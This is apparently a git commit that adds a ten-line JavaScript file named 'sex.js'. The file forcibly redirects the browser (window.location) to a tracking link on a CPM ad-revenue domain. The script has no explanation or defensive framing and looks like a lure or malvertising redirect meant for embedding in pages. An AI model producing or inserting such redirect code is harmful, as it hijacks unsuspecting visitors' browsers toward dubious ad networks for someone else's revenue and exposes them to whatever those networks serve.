b8bb8892e0a5fc77640964ca071ba0a6fbab5fdc
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2022-01-13 11:17:35 +0800

    Create sex.js

---
+++ sex.js
@@ -0,0 +1,10 @@
+var dataUrl = [
+  
+  'https://www.trustedcpmrevenue.com/b2qvc4rgc?key=d7496e57b271ae9054774812d9235e12'
+ 
+  
+  
+ 
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
